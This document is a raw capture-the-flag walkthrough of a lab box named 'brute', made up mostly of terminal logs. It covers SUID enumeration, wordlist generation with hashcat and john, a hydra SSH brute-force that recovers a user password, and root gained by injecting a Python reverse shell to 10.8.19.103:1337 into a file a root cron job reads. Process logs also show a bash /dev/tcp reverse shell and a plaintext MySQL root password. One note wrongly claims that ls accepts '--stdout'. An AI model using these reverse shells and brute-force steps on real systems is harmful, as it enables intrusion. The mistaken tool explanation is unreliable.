-rwsr-xr-x 1 root   root             87K Jul 14  2021 /snap/core20/1405/usr/bin/gpasswd
-rwsr-xr-x 1 root   root             55K Feb  7  2022 /snap/core20/1405/usr/bin/mount
-rwsr-xr-x 1 root   root             44K Jul 14  2021 /snap/core20/1405/usr/bin/newgrp
-rwsr-xr-x 1 root   root             67K Jul 14  2021 /snap/core20/1405/usr/bin/passwd
-rwsr-xr-x 1 root   root             67K Feb  7  2022 /snap/core20/1405/usr/bin/su
-rwsr-xr-x 1 root   root            163K Jan 19  2021 /snap/core20/1405/usr/bin/sudo
-rwsr-xr-x 1 root   root             39K Feb  7  2022 /snap/core20/1405/usr/bin/umount
-rwsr-xr-- 1 root   systemd-resolve  51K Jun 11  2020 /snap/core20/1405/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root   root            463K Dec  2  2021 /snap/core20/1405/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root   root            121K Mar 22  2022 /snap/snapd/15314/usr/lib/snapd/snap-confine
-rwsr-sr-x 1 daemon daemon           55K Nov 12  2018 /usr/bin/at
-rwsr-xr-x 1 root   root             84K Jul 14  2021 /usr/bin/chfn
-rwsr-xr-x 1 root   root             52K Jul 14  2021 /usr/bin/chsh
-rwsr-xr-x 1 root   root             39K Mar  7  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root   root             87K Jul 14  2021 /usr/bin/gpasswd
-rwsr-xr-x 1 root   root             55K Feb  7  2022 /usr/bin/mount
-rwsr-xr-x 1 root   root             44K Jul 14  2021 /usr/bin/newgrp
-rwsr-xr-x 1 root   root             67K Jul 14  2021 /usr/bin/passwd
-rwsr-xr-x 1 root   root             31K Feb 21  2022 /usr/bin/pkexec
-rwsr-xr-x 1 root   root             67K Feb  7  2022 /usr/bin/su
-rwsr-xr-x 1 root   root            163K Jan 19  2021 /usr/bin/sudo
-rwsr-xr-x 1 root   root             39K Feb  7  2022 /usr/bin/umount
-rwsr-xr-- 1 root   messagebus       51K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root   root             15K Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root   root            463K Dec  2  2021 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root   root             23K Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root   root            140K Feb 23  2022 /usr/lib/snapd/snap-confine

www-data@brute:/home/adrian$ cat user.txt
cat user.txt
cat: user.txt: Permission denied
www-data@brute:/home/adrian$ ls -lah
ls -lah
total 48K
drwxr-xr-x 4 adrian adrian  4.0K Apr  5  2022 .
drwxr-xr-x 3 root   root    4.0K Oct 19  2021 ..
lrwxrwxrwx 1 adrian adrian     9 Oct 20  2021 .bash_history -> /dev/null
-rw-r--r-- 1 adrian adrian   220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 adrian adrian  3.7K Feb 25  2020 .bashrc
drwx------ 2 adrian adrian  4.0K Oct 19  2021 .cache
-rw-r--r-- 1 adrian adrian   807 Feb 25  2020 .profile
-rw-r--r-- 1 adrian adrian    43 Oct 20  2021 .reminder
-rw-rw-r-- 1 adrian adrian    75 Apr  5  2022 .selected_editor
-rw-r--r-- 1 adrian adrian     0 Oct 19  2021 .sudo_as_admin_successful
-rw------- 1 adrian adrian     0 Apr  6  2022 .viminfo
drwxr-xr-x 3 nobody nogroup 4.0K Oct 20  2021 ftp
-rw-r----- 1 adrian adrian  2.1K Jan 13 17:50 punch_in
-rw-r----- 1 root   adrian    94 Apr  5  2022 punch_in.sh
-rw-r----- 1 adrian adrian    21 Apr  5  2022 user.txt
www-data@brute:/home/adrian$ cat .bash_history
cat .bash_history
www-data@brute:/home/adrian$ cat .sudo_as_admin_successful
cat .sudo_as_admin_successful
www-data@brute:/home/adrian$ cat .reminder
cat .reminder
Rules:
best of 64
+ exclamation

ettubrute

---
Et tu, Brute? es una frase latina supuestamente pronunciada por Julio César en el momento de ser asesinado. Se utiliza para expresar una traición inesperada. No hay certeza de que César dijera algo en el momento de su muerte.
---

using hashcat to create a dictionary

┌──(kali㉿kali)-[~/nappy/brutus]
└─$ echo 'ettubrute' > pass.txt                                                                        
                                                                                                                                          
┌──(kali㉿kali)-[~/nappy/brutus]
└─$ echo '$!' > append.txt    

┌──(kali㉿kali)-[~/nappy]
└─$ locate best64 
/usr/share/hashcat/rules/best64.rule
/usr/share/john/rules/best64.rule

┌──(kali㉿kali)-[~/nappy/brutus]
└─$ hashcat --stdout pass.txt -r /usr/share/hashcat/rules/best64.rule -r append.txt > hashcat_list.txt
                                                                                                                                          
┌──(kali㉿kali)-[~/nappy/brutus]
└─$ cat hashcat_list.txt | wc -l
77

┌──(kali㉿kali)-[~/nappy/brutus]
└─$ hydra -l adrian -P hashcat_list.txt 10.10.183.215 ssh -V -t 64
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-01-13 13:09:42
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 77 login tries (l:1/p:77), ~2 tries per task
[DATA] attacking ssh://10.10.183.215:22/
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "ettubrute!" - 1 of 77 [child 0] (0/0)
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "eturbutte!" - 2 of 77 [child 1] (0/0)
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "ETTUBRUTE!" - 3 of 77 [child 2] (0/0)
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "Ettubrute!" - 4 of 77 [child 3] (0/0)
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "ettubrute0!" - 5 of 77 [child 4] (0/0)
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "ettubrute1!" - 6 of 77 [child 5] (0/0)
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "ettubrute2!" - 7 of 77 [child 6] (0/0)
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "ettubrute3!" - 8 of 77 [child 7] (0/0)
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "ettubrute4!" - 9 of 77 [child 8] (0/0)
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "ettubrute5!" - 10 of 77 [child 9] (0/0)
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "ettubrute6!" - 11 of 77 [child 10] (0/0)
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "ettubrute7!" - 12 of 77 [child 11] (0/0)
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "ettubrute8!" - 13 of 77 [child 12] (0/0)
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "ettubrute9!" - 14 of 77 [child 13] (0/0)
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "ettubrute00!" - 15 of 77 [child 14] (0/0)
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "ettubrute01!" - 16 of 77 [child 15] (0/0)
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "ettubrute02!" - 17 of 77 [child 16] (0/0)
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "ettubrute11!" - 18 of 77 [child 17] (0/0)
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "ettubrute12!" - 19 of 77 [child 18] (0/0)
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "ettubrute13!" - 20 of 77 [child 19] (0/0)
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "ettubrute21!" - 21 of 77 [child 20] (0/0)
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "ettubrute22!" - 22 of 77 [child 21] (0/0)
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "ettubrute23!" - 23 of 77 [child 22] (0/0)
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "ettubrute69!" - 24 of 77 [child 23] (0/0)
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "ettubrute77!" - 25 of 77 [child 24] (0/0)
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "ettubrute88!" - 26 of 77 [child 25] (0/0)
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "ettubrute99!" - 27 of 77 [child 26] (0/0)
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "ettubrute123!" - 28 of 77 [child 27] (0/0)
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "ettubrutee!" - 29 of 77 [child 28] (0/0)
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "ettubrutes!" - 30 of 77 [child 29] (0/0)
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "ettubruta!" - 31 of 77 [child 30] (0/0)
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "ettubrus!" - 32 of 77 [child 31] (0/0)
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "ettubrua!" - 33 of 77 [child 32] (0/0)
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "ettubruer!" - 34 of 77 [child 33] (0/0)
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "ettubruie!" - 35 of 77 [child 34] (0/0)
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "ettubro!" - 36 of 77 [child 35] (0/0)
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "ettubry!" - 37 of 77 [child 36] (0/0)
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "ettubr123!" - 38 of 77 [child 37] (0/0)
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "ettubrman!" - 39 of 77 [child 38] (0/0)
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "ettubrdog!" - 40 of 77 [child 39] (0/0)
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "1ettubrute!" - 41 of 77 [child 40] (0/0)
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "theettubrute!" - 42 of 77 [child 41] (0/0)
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "dttubrute!" - 43 of 77 [child 42] (0/0)
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "matubrute!" - 44 of 77 [child 43] (0/0)
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "ettubrute!" - 45 of 77 [child 44] (0/0)
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "ettubrute!" - 46 of 77 [child 45] (0/0)
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "3ttubrut3!" - 47 of 77 [child 46] (0/0)
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "etubrute!" - 48 of 77 [child 47] (0/0)
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "etbrute!" - 49 of 77 [child 48] (0/0)
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "ettbrute!" - 50 of 77 [child 49] (0/0)
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "etturute!" - 51 of 77 [child 50] (0/0)
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "ettb!" - 52 of 77 [child 51] (0/0)
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "ettub1!" - 53 of 77 [child 52] (0/0)
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "ettubrut!" - 54 of 77 [child 53] (0/0)
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "ettubru!" - 55 of 77 [child 54] (0/0)
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "ettubr!" - 56 of 77 [child 55] (0/0)
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "ettubrettubr!" - 57 of 77 [child 56] (0/0)
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "etubr!" - 58 of 77 [child 57] (0/0)
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "bsut!" - 59 of 77 [child 58] (0/0)
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "etubrut!" - 60 of 77 [child 59] (0/0)
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "ettubre!" - 61 of 77 [child 60] (0/0)
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "sttubru!" - 62 of 77 [child 61] (0/0)
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "uteettubr!" - 63 of 77 [child 62] (0/0)
[ATTEMPT] target 10.10.183.215 - login "adrian" - pass "rute!" - 64 of 77 [child 63] (0/0)
[22][ssh] host: 10.10.183.215   login: adrian   password: theettubrute!
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 25 final worker threads did not complete until end.
[ERROR] 25 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-01-13 13:09:50

adrian:theettubrute!

using john to create a dictionary

"--stdout" is a command line option, it can be used to redirect the standard output of a command to a file or another location.

For example, if you ran the command "ls --stdout > filelist.txt", the output of the "ls" command (which would normally be displayed on the terminal) would be redirected to a file called "filelist.txt".

┌──(kali㉿kali)-[~/nappy/brutus]
└─$ john --rules=best64 --wordlist=pass.txt --stdout > john_list.txt
Using default input encoding: UTF-8
Press 'q' or Ctrl-C to abort, almost any other key for status
75p 0:00:00:00 100.00% (2023-01-13 13:14) 170.4p/s erutee
                                                                                                                                          
┌──(kali㉿kali)-[~/nappy/brutus]
└─$ cat john_list.txt | wc -l   
75

┌──(kali㉿kali)-[~/nappy/brutus]
└─$ cat john_list.txt | grep the
theettubrute

now adding ! to list

You can use the sed command to add a string to the end of each line in a file. The following command will add "!" at the end of each line in the file "john_list.txt":

Copy code

`sed 's/$/!/' john_list.txt > john_list_modified.txt`

This command uses the sed command to search for the end of each line (indicated by the "$" symbol) and replace it with "!" (the string you want to add). The modified lines are then output to a new file called "john_list_modified.txt"

It's worth noting that the original file is not modified, the modified lines are output to a new file, in this case "john_list_modified.txt"

You can also use the -i option to edit the file in place

Copy code

`sed -i 's/$/!/' john_list.txt`

This will edit the file john_list.txt and add "!" at the end of each line

let's do it!

┌──(kali㉿kali)-[~/nappy/brutus]
└─$ sed -i 's/$/!/' john_list.txt      

                                                                                                                                          
┌──(kali㉿kali)-[~/nappy/brutus]
└─$ cat john_list.txt | grep the
theettubrute!

:)

now login with ssh

┌──(kali㉿kali)-[~/nappy/brutus]
└─$ ssh adrian@10.10.183.215     
The authenticity of host '10.10.183.215 (10.10.183.215)' can't be established.
ED25519 key fingerprint is SHA256:IrziL4jB1v+vS+zEJrCmPDK2Y2e5MG9qqxYh5WIfCSM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.183.215' (ED25519) to the list of known hosts.
adrian@10.10.183.215's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-89-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 13 Jan 2023 06:19:58 PM UTC

  System load:  0.0                Processes:             123
  Usage of /:   39.9% of 18.57GB   Users logged in:       0
  Memory usage: 62%                IPv4 address for eth0: 10.10.183.215
  Swap usage:   0%


18 updates can be applied immediately.
8 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Apr  5 23:46:50 2022 from 10.0.2.26
adrian@brute:~$ cd /home/adrian
adrian@brute:~$ ls
ftp  punch_in  punch_in.sh  user.txt
adrian@brute:~$ cat user.txt
THM{PoI$0n_tH@t_L0g}

adrian@brute:~$ cat punch_in
Punched in at 16:04
Punched in at 16:05

adrian@brute:~$ cat punch_in.sh 
#!/bin/bash

/usr/bin/echo 'Punched in at '$(/usr/bin/date +"%H:%M") >> /home/adrian/punch_in

adrian@brute:~/ftp/files$ cat script 
#!/bin/sh
while read line;
do
  /usr/bin/sh -c "echo $line";
done < /home/adrian/punch_in

adrian@brute:~/ftp/files$ cat .notes
That silly admin
He is such a micro manager, wants me to check in every minute by writing
on my punch card.

He even asked me to write the script for him.

Little does he know, I am planning my revenge.

add this:

`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.19.103",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'`

┌──(kali㉿kali)-[~/nappy]
└─$ rlwrap nc -lvnp 1337
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.183.215.
Ncat: Connection from 10.10.183.215:57770.
root@brute:~# cat /root/root.txt
cat /root/root.txt
THM{C0mm@nD_Inj3cT1on_4_D@_BruT3}

or

┌──(kali㉿kali)-[~/nappy]
└─$ locate pspy   
/home/kali/hackthebox/pspy64s

┌──(kali㉿kali)-[~/nappy]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.183.215 - - [13/Jan/2023 13:47:34] "GET /pspy64s HTTP/1.1" 200 -

adrian@brute:~$ wget http://10.8.19.103:8000/pspy64s
--2023-01-13 18:47:33--  http://10.8.19.103:8000/pspy64s
Connecting to 10.8.19.103:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1156536 (1.1M) [application/octet-stream]
Saving to: ‘pspy64s’

pspy64s                            100%[==============================================================>]   1.10M   550KB/s    in 2.1s    

2023-01-13 18:47:35 (550 KB/s) - ‘pspy64s’ saved [1156536/1156536]

adrian@brute:~$ chmod +x pspy64s

adrian@brute:~$ ./pspy64s 
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2023/01/13 18:49:03 CMD: UID=0    PID=95     | 
2023/01/13 18:49:03 CMD: UID=0    PID=94     | 
2023/01/13 18:49:03 CMD: UID=0    PID=92     | 
2023/01/13 18:49:03 CMD: UID=0    PID=91     | 
2023/01/13 18:49:03 CMD: UID=0    PID=90     | 
2023/01/13 18:49:03 CMD: UID=0    PID=9      | 
2023/01/13 18:49:03 CMD: UID=0    PID=89     | 
2023/01/13 18:49:03 CMD: UID=0    PID=88     | 
2023/01/13 18:49:03 CMD: UID=0    PID=87     | 
2023/01/13 18:49:03 CMD: UID=0    PID=86     | 
2023/01/13 18:49:03 CMD: UID=0    PID=85     | 
2023/01/13 18:49:03 CMD: UID=0    PID=8390   | 
2023/01/13 18:49:03 CMD: UID=113  PID=834    | /usr/sbin/mysqld 
2023/01/13 18:49:03 CMD: UID=0    PID=83     | 
2023/01/13 18:49:03 CMD: UID=0    PID=82     | 
2023/01/13 18:49:03 CMD: UID=33   PID=797    | /usr/sbin/apache2 -k start 
2023/01/13 18:49:03 CMD: UID=33   PID=796    | /usr/sbin/apache2 -k start 
2023/01/13 18:49:03 CMD: UID=33   PID=795    | /usr/sbin/apache2 -k start 
2023/01/13 18:49:03 CMD: UID=33   PID=794    | /usr/sbin/apache2 -k start 
2023/01/13 18:49:03 CMD: UID=33   PID=790    | /usr/sbin/apache2 -k start 
2023/01/13 18:49:03 CMD: UID=0    PID=78     | 
2023/01/13 18:49:03 CMD: UID=0    PID=77     | 
2023/01/13 18:49:03 CMD: UID=0    PID=766    | /usr/sbin/apache2 -k start 
2023/01/13 18:49:03 CMD: UID=0    PID=763    | /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal                                                                                                                                        
2023/01/13 18:49:03 CMD: UID=0    PID=76     | 
2023/01/13 18:49:03 CMD: UID=0    PID=753    | /usr/bin/ssm-agent-worker 
2023/01/13 18:49:03 CMD: UID=0    PID=75     | 
2023/01/13 18:49:03 CMD: UID=0    PID=74     | 
2023/01/13 18:49:03 CMD: UID=0    PID=734    | /usr/lib/policykit-1/polkitd --no-debug 
2023/01/13 18:49:03 CMD: UID=0    PID=73     | 
2023/01/13 18:49:03 CMD: UID=0    PID=72     | 
2023/01/13 18:49:03 CMD: UID=33   PID=7182   | /bin/bash 
2023/01/13 18:49:03 CMD: UID=33   PID=7181   | python3 -c import pty;pty.spawn("/bin/bash") 
2023/01/13 18:49:03 CMD: UID=0    PID=71     | 
2023/01/13 18:49:03 CMD: UID=33   PID=7072   | bash -i 
2023/01/13 18:49:03 CMD: UID=33   PID=7071   | bash -c bash -i >& /dev/tcp/10.8.19.103/4444 0>&1 
2023/01/13 18:49:03 CMD: UID=33   PID=7070   | sh -c bash -c 'bash -i >& /dev/tcp/10.8.19.103/4444 0>&1' 
2023/01/13 18:49:03 CMD: UID=0    PID=706    | sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups 
2023/01/13 18:49:03 CMD: UID=0    PID=705    | /sbin/agetty -o -p -- \u --noclear tty1 linux 
2023/01/13 18:49:03 CMD: UID=0    PID=702    | /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220 
2023/01/13 18:49:03 CMD: UID=0    PID=70     | 
2023/01/13 18:49:03 CMD: UID=0    PID=674    | /usr/sbin/vsftpd /etc/vsftpd.conf 
2023/01/13 18:49:03 CMD: UID=0    PID=660    | /usr/sbin/atd -f 
2023/01/13 18:49:03 CMD: UID=0    PID=656    | /usr/lib/udisks2/udisksd 
2023/01/13 18:49:03 CMD: UID=0    PID=654    | /lib/systemd/systemd-logind 
2023/01/13 18:49:03 CMD: UID=0    PID=649    | /usr/lib/snapd/snapd 
2023/01/13 18:49:03 CMD: UID=104  PID=639    | /usr/sbin/rsyslogd -n -iNONE 
2023/01/13 18:49:03 CMD: UID=0    PID=630    | /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers 
2023/01/13 18:49:03 CMD: UID=103  PID=605    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only                                                                                                                             
2023/01/13 18:49:03 CMD: UID=0    PID=601    | /usr/sbin/cron -f 
2023/01/13 18:49:03 CMD: UID=0    PID=6      | 
2023/01/13 18:49:03 CMD: UID=0    PID=596    | /usr/bin/amazon-ssm-agent 
2023/01/13 18:49:03 CMD: UID=0    PID=595    | /usr/lib/accountsservice/accounts-daemon 
2023/01/13 18:49:03 CMD: UID=101  PID=583    | /lib/systemd/systemd-resolved 
2023/01/13 18:49:03 CMD: UID=100  PID=579    | /lib/systemd/systemd-networkd 
2023/01/13 18:49:03 CMD: UID=102  PID=532    | /lib/systemd/systemd-timesyncd 
2023/01/13 18:49:03 CMD: UID=0    PID=515    | 
2023/01/13 18:49:03 CMD: UID=0    PID=514    | 
2023/01/13 18:49:03 CMD: UID=0    PID=505    | 
2023/01/13 18:49:03 CMD: UID=0    PID=503    | 
2023/01/13 18:49:03 CMD: UID=0    PID=500    | 
2023/01/13 18:49:03 CMD: UID=0    PID=498    | 
2023/01/13 18:49:03 CMD: UID=0    PID=496    | 
2023/01/13 18:49:03 CMD: UID=0    PID=494    | 
2023/01/13 18:49:03 CMD: UID=0    PID=493    | 
2023/01/13 18:49:03 CMD: UID=0    PID=484    | /sbin/multipathd -d -s 
2023/01/13 18:49:03 CMD: UID=0    PID=483    | 
2023/01/13 18:49:03 CMD: UID=0    PID=482    | 
2023/01/13 18:49:03 CMD: UID=0    PID=481    | 
2023/01/13 18:49:03 CMD: UID=0    PID=480    | 
2023/01/13 18:49:03 CMD: UID=0    PID=4      | 
2023/01/13 18:49:03 CMD: UID=0    PID=373    | /lib/systemd/systemd-udevd 
2023/01/13 18:49:03 CMD: UID=0    PID=344    | /lib/systemd/systemd-journald 
2023/01/13 18:49:03 CMD: UID=0    PID=3      | 
2023/01/13 18:49:03 CMD: UID=0    PID=273    | 
2023/01/13 18:49:03 CMD: UID=0    PID=272    | 
2023/01/13 18:49:03 CMD: UID=0    PID=24     | 
2023/01/13 18:49:03 CMD: UID=0    PID=23     | 
2023/01/13 18:49:03 CMD: UID=0    PID=225    | 
2023/01/13 18:49:03 CMD: UID=0    PID=22     | 
2023/01/13 18:49:03 CMD: UID=0    PID=21     | 
2023/01/13 18:49:03 CMD: UID=0    PID=20     | 
2023/01/13 18:49:03 CMD: UID=0    PID=2      | 
2023/01/13 18:49:03 CMD: UID=0    PID=199    | 
2023/01/13 18:49:03 CMD: UID=0    PID=19     | 
2023/01/13 18:49:03 CMD: UID=0    PID=18129  | /lib/systemd/systemd-udevd 
2023/01/13 18:49:03 CMD: UID=0    PID=18128  | /lib/systemd/systemd-udevd 
2023/01/13 18:49:03 CMD: UID=0    PID=18127  | /lib/systemd/systemd-udevd 
2023/01/13 18:49:03 CMD: UID=1000 PID=18120  | ./pspy64s 
2023/01/13 18:49:03 CMD: UID=0    PID=18     | 
2023/01/13 18:49:03 CMD: UID=0    PID=17559  | bash 
2023/01/13 18:49:03 CMD: UID=0    PID=17557  | python3 -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.19.103",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")           
2023/01/13 18:49:03 CMD: UID=0    PID=17556  | /usr/bin/sh -c echo `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.19.103",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'`                                                                                                                             
2023/01/13 18:49:03 CMD: UID=0    PID=17386  | /usr/bin/bash /root/check_in.sh 
2023/01/13 18:49:03 CMD: UID=0    PID=17384  | /bin/sh -c /usr/bin/bash /root/check_in.sh 
2023/01/13 18:49:03 CMD: UID=0    PID=17381  | /usr/sbin/CRON -f 
2023/01/13 18:49:03 CMD: UID=0    PID=17     | 
2023/01/13 18:49:03 CMD: UID=0    PID=16842  | 
2023/01/13 18:49:03 CMD: UID=0    PID=16442  | 
2023/01/13 18:49:03 CMD: UID=0    PID=16     | 
2023/01/13 18:49:03 CMD: UID=33   PID=1578   | /usr/sbin/apache2 -k start 
2023/01/13 18:49:03 CMD: UID=0    PID=156    | 
2023/01/13 18:49:03 CMD: UID=0    PID=15     | 
2023/01/13 18:49:03 CMD: UID=0    PID=14     | 
2023/01/13 18:49:03 CMD: UID=1000 PID=13188  | -bash 
2023/01/13 18:49:03 CMD: UID=1000 PID=13187  | sshd: adrian@pts/1   
2023/01/13 18:49:03 CMD: UID=1000 PID=13109  | (sd-pam) 
2023/01/13 18:49:03 CMD: UID=0    PID=13103  | 
2023/01/13 18:49:03 CMD: UID=1000 PID=13102  | /lib/systemd/systemd --user 
2023/01/13 18:49:03 CMD: UID=0    PID=13094  | sshd: adrian [priv]  
2023/01/13 18:49:03 CMD: UID=0    PID=13     | 
2023/01/13 18:49:03 CMD: UID=0    PID=121    | 
2023/01/13 18:49:03 CMD: UID=0    PID=12     | 
2023/01/13 18:49:03 CMD: UID=0    PID=11     | 
2023/01/13 18:49:03 CMD: UID=0    PID=108    | 
2023/01/13 18:49:03 CMD: UID=0    PID=105    | 
2023/01/13 18:49:03 CMD: UID=0    PID=104    | 
2023/01/13 18:49:03 CMD: UID=0    PID=10     | 
2023/01/13 18:49:03 CMD: UID=0    PID=1      | /sbin/init maybe-ubiquity 
2023/01/13 18:50:01 CMD: UID=0    PID=18317  | /usr/sbin/CRON -f 
2023/01/13 18:50:01 CMD: UID=0    PID=18316  | /usr/sbin/CRON -f 
2023/01/13 18:50:01 CMD: UID=0    PID=18315  | /usr/sbin/CRON -f 
2023/01/13 18:50:01 CMD: UID=0    PID=18319  | /usr/sbin/CRON -f 
2023/01/13 18:50:01 CMD: UID=0    PID=18318  | /usr/sbin/CRON -f 
2023/01/13 18:50:01 CMD: UID=1000 PID=18320  | /usr/bin/bash /home/adrian/punch_in.sh 
2023/01/13 18:50:01 CMD: UID=0    PID=18322  | /bin/sh -c /usr/bin/bash /root/check_in.sh 
2023/01/13 18:50:01 CMD: UID=1000 PID=18321  | 
2023/01/13 18:50:01 CMD: UID=0    PID=18323  | /usr/bin/bash /root/check_in.sh 
2023/01/13 18:50:01 CMD: UID=0    PID=18326  | /usr/bin/bash /root/check_in.sh 
2023/01/13 18:50:01 CMD: UID=0    PID=18325  | /usr/sbin/CRON -f 
2023/01/13 18:50:01 CMD: UID=1000 PID=18324  | /usr/bin/bash /home/adrian/punch_in.sh 
2023/01/13 18:50:01 CMD: UID=0    PID=18327  | /usr/bin/bash /root/check_in.sh 
2023/01/13 18:50:01 CMD: UID=0    PID=18328  | /bin/sh -c /usr/bin/mysql -h localhost -u root -p'SuperSqlP@ss3' -e 'flush hosts;' 
